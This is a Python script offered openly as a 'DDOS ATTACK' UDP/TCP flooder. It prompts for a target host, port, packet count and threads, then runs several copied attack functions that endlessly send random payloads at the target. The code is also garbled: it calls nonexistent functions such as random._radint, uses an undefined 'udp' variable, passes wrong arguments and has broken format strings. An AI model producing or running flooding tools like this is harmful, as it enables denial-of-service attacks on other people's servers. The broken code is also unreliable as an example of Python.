"""
UDP Flooder.
This is a 'Dos' attack program to attack servers, you set the IP always that you have permission to do it.
and the port and the amount of seconds and it will start flooding to that server.
Created by JECOSTER -> https://github.com/JECOSTER/Python-UDP-Flood
Usage : ./flood_udp
Press enter to continue and introduce the data.
"""
import signal
import time
import socket
import random
import threading
import sys
import os
from os import system, name

print("\033[1;34;40m \n")
os.system("figlet DDOS ATTACK -f slant")
print("\033[1;33;40m If you have any issue post a thread on https://github.com/JECOSTER/Python-UDP-Flood/issues\n")

print("\033[1;32;40m ===>>> [ Code Jecoster Attack ] <<<===  \n")
test = input()
if test == "n":
	exit(0)
name = str(input(" [K] Masukan Nama Kamu:"))
ip = str(input("\033[1;33;40m [K] Enter Attack Host:"))
port = int(input("\033[1;33;40m [K] Enter Attack Port:"))
choice = str(input("\033[1;33;40m [K] Enter Methods Attack UDP And Tcp(Jecoster/n):"))
times = int(input("\033[1;33;40m [K] Enter Attack Packets Connection:"))
threads = int(input("\033[1;33;40m [K] Enter Attack Threads Connection:"))
os.system("clear")

def Attack():
	bytes = random._urandom(200, 8095)
	bytes = random._urandom(200000)
	pack = random._urandom(444)
	K = random.choice(("[K]","[K]","[K]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if udp else socket.SOCK_STREAM)
			addr = (str(ip),int(port))
			s.sendto(bytes,addr,pack)
			for x in range(times):
				s.sendto(bytes,addr,pack)
			print(K +"Sent Attack To Host And Port % %"(ip(str,port))
		except:
			s.close()
			print("[K] Sent Attack To Host And Port % %"(ip(str,port))

def Attack2():
	bytes = random._radint(499, 65534)
	bytes = random._urandom(65534)
	pack = random._urandom(444)
	K = random.choice(("[K]","[K]","[K]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if udp else socket.SOCK_STREAM)
			addr = (str(ip),int(port))
			s.sendto(bytes,addr,pack)
			for x in range(times):
				s.sendto(bytes,addr,pack)
			print(K +"Sent Attack To Host And Port % %"(ip(str,port))
		except:
			s.close()
			print("[K] Sent Attack To Host And Port % %"(ip(str,port))

def Attack3():
	bytes = random._radint(443, 37682)
	bytes = random._urandom(65534)
	pack = random._urandom(444)
	K = random.choice(("[K]","[K]","[K]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if udp else socket.SOCK_STREAM)
			addr = (str(ip),int(port))
			s.sendto(bytes,addr,pack)
			for x in range(times):
				s.sendto(bytes,addr,pack)
			print(K +"Sent Attack To Host And Port % %"(ip(str,port))
		except:
			s.close()
			print("[K] Sent Attack To Host And Port % %"(ip(str,port))

def Attack4():
	bytes = random._radint(400, 20000)
	bytes = random._urandom(99999)
	pack = random._urandom(444)
	K = random.choice(("[K]","[K]","[K]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if udp else socket.SOCK_STREAM)
			addr = (str(ip),int(port))
			s.sendto(bytes,addr,pack)
			for x in range(times):
				s.sendto(bytes,addr,pack)
			print(K +"Sent Attack To Host And Port % %"(ip(str,port))
		except:
			s.close()
			print("[K] Sent Attack To Host And Port % %"(ip(str,port))

def Attack5():
	bytes = random._radint(65534, 800)
	bytes = random._urandom(4096)
	pack = random._urandom(444)
	K = random.choice(("[K]","[K]","[K]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if udp else socket.SOCK_STREAM)
			addr = (str(ip),int(port))
			s.sendto(bytes,addr,pack)
			for x in range(times):
				s.sendto(bytes,addr,pack)
			print(K +"Sent Attack To Host And Port % %"(ip(str,port))
		except:
			s.close()
			print("[K] Sent Attack To Host And Port % %"(ip(str,port))

def Attack6():
	bytes = random._radint(21377, 106784)
	bytes = random._urandom(20000)
	pack = random._urandom(444)
	K = random.choice(("[K]","[K]","[K]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if udp else socket.SOCK_STREAM)
			addr = (str(ip),int(port))
			s.sendto(bytes,addr,pack)
			for x in range(times):
				s.sendto(bytes,addr,pack)
			print(K +"Sent Attack To Host And Port % %"(ip(str,port))
		except:
			s.close()
			print("[K] Sent Attack To Host And Port % %"(ip(str,port))

def Attack7():
	bytes = random._radint(577, 12345)
	bytes = random._urandom(65534)
	pack = random._urandom(444)
	K = random.choice(("[K]","[K]","[K]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if udp else socket.SOCK_STREAM)
			addr = (str(ip),int(port))
			s.sendto(bytes,addr,pack)
			for x in range(times):
				s.sendto(bytes,addr,pack)
			print(K +"Sent Attack To Host And Port % %"(ip(str,port))
		except:
			s.close()
			print("[K] Sent Attack To Host And Port % %"(ip(str,port))

for y in range(threads):
	if choice == 'Jecoster':
		th = threading.Thread(target = Attack)
		th.start()
		th = threading.Thread(target = Attack2)
		th.start()
		th = threading.Thread(target = Attack3)
		th.start()
		th = threading.Thread(target = Attack4)
		th.start()
		th = threading.Thread(target = Attack6)
		th.start()
		th = threading.Thread(target = Attack7)
		th.start()

def new():
	for y in range(threads):
		if choice == 'Jecoster':
			th = threading.Thread(target = Attack)
			th.start()
			th = threading.Thread(target = Attack2)
			th.start()
			th = threading.Thread(target = Attack3)
			th.start()
			th = threading.Thread(target = Attack4)
			th.start()
			th = threading.Thread(target = Attack5)
			th.start()
			th = threading.Thread(target = Attack6)
			th.start()
			th = threading.Thread(target = Attack7)
			th.start()

def whereuwere():
    print("Aww man, I'm so sorry, but I can't remember if u were in TCP or UDP")
    print("Put 1 for UDP and 2 for TCP")
    whereman = str(input(" 1 or 2 >:("))
    if whereman == '1':
        Attack()
        Attack2()
        Attack3()
        Attack4()
        Attack5()
        Attack6()
        Attack7()

def clear():
    if name == 'nt':
        _ = system('cls')
    else:
        _ = system('clear')

def byebye():
	clear()
	os.system("figlet Youre Leaving Sir -f slant")
	sys.exit(130)

def exit_gracefully(signum, frame):
    # restore the original signal handler
    signal.signal(signal.SIGINT, original_sigint)

    try:
        exitc = str(input(" You wanna exit bby <3 ?:"))
        if exitc == 'y':

            byebye()

    except KeyboardInterrupt:
        print("Ok ok")
        byebye()

    # restore the gracefully exit handler
    signal.signal(signal.SIGINT, exit_gracefully)

if __name__ == '__main__':
    # store SIGINT handler
    original_sigint = signal.getsignal(signal.SIGINT)
    signal.signal(signal.SIGINT, exit_gracefully)
